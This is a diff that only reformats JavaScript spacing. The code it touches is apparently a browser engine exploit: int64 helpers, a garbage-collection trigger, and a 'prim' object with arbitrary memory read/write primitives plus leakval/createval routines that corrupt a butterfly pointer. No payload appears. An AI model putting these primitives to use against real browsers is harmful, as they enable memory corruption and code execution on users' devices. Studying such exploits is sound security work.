@@ -23,7 +23,7 @@ function u2d(low, hi) {
     _dview.setUint32(4, low);
     return _dview.getFloat64(0);
 }
-var dgc = function() {
+var dgc = function () {
     for (var i = 0; i < 0x100; i++) {
         new ArrayBuffer(0x100000);
     }
@@ -33,7 +33,7 @@ function int64(low, hi) {
     this.low = (low >>> 0);
     this.hi = (hi >>> 0);
 
-    this.add32inplace = function(val) {
+    this.add32inplace = function (val) {
         var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
         var new_hi = (this.hi >>> 0);
 
@@ -45,7 +45,7 @@ function int64(low, hi) {
         this.low = new_lo;
     }
 
-    this.add32 = function(val) {
+    this.add32 = function (val) {
         var new_lo = (((this.low >>> 0) + val) & 0xFFFFFFFF) >>> 0;
         var new_hi = (this.hi >>> 0);
 
@@ -56,7 +56,7 @@ function int64(low, hi) {
         return new int64(new_lo, new_hi);
     }
 
-    this.sub32 = function(val) {
+    this.sub32 = function (val) {
         var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
         var new_hi = (this.hi >>> 0);
 
@@ -67,7 +67,7 @@ function int64(low, hi) {
         return new int64(new_lo, new_hi);
     }
 
-    this.sub32inplace = function(val) {
+    this.sub32inplace = function (val) {
         var new_lo = (((this.low >>> 0) - val) & 0xFFFFFFFF) >>> 0;
         var new_hi = (this.hi >>> 0);
 
@@ -79,19 +79,19 @@ function int64(low, hi) {
         this.low = new_lo;
     }
 
-    this.and32 = function(val) {
+    this.and32 = function (val) {
         var new_lo = this.low & val;
         var new_hi = this.hi;
         return new int64(new_lo, new_hi);
     }
 
-    this.and64 = function(vallo, valhi) {
+    this.and64 = function (vallo, valhi) {
         var new_lo = this.low & vallo;
         var new_hi = this.hi & valhi;
         return new int64(new_lo, new_hi);
     }
 
-    this.toString = function(val) {
+    this.toString = function (val) {
         val = 16;
         var lo_str = (this.low >>> 0).toString(val);
         var hi_str = (this.hi >>> 0).toString(val);
@@ -104,14 +104,14 @@ function int64(low, hi) {
         return hi_str + lo_str;
     }
 
-    this.toPacked = function() {
+    this.toPacked = function () {
         return {
             hi: this.hi,
             low: this.low
         };
     }
 
-    this.setPacked = function(pck) {
+    this.setPacked = function (pck) {
         this.hi = pck.hi;
         this.low = pck.low;
         return this;
@@ -132,7 +132,7 @@ function zeroFill(number, width) {
 
 var nogc = [];
 
-var fail = function() {
+var fail = function () {
     alert.apply(null, arguments);
     throw "fail";
 }
@@ -260,7 +260,7 @@ tgt.c = 0;
 hax = 0;
 
 var prim = {
-    write8: function(addr, val) {
+    write8: function (addr, val) {
         master[4] = addr.low;
         master[5] = addr.hi;
 
@@ -276,7 +276,7 @@ var prim = {
         master[5] = addr_to_slavebuf.hi;
     },
 
-    write4: function(addr, val) {
+    write4: function (addr, val) {
         master[4] = addr.low;
         master[5] = addr.hi;
 
@@ -286,7 +286,7 @@ var prim = {
         master[5] = addr_to_slavebuf.hi;
     },
 
-    read8: function(addr) {
+    read8: function (addr) {
         master[4] = addr.low;
         master[5] = addr.hi;
 
@@ -298,7 +298,7 @@ var prim = {
         return rtv;
     },
 
-    read4: function(addr) {
+    read4: function (addr) {
         master[4] = addr.low;
         master[5] = addr.hi;
 
@@ -310,7 +310,7 @@ var prim = {
         return rtv;
     },
 
-    leakval: function(jsval) {
+    leakval: function (jsval) {
         leakval_helper[0] = jsval;
         var rtv = this.read8(butterfly);
         this.write8(butterfly, new int64(0x41414141, 0xffff0000));
@@ -318,7 +318,7 @@ var prim = {
         return rtv;
     },
 
-    createval: function(jsval) {
+    createval: function (jsval) {
         this.write8(butterfly, jsval);
         var rt = leakval_helper[0];
         this.write8(butterfly, new int64(0x41414141, 0xffff0000));
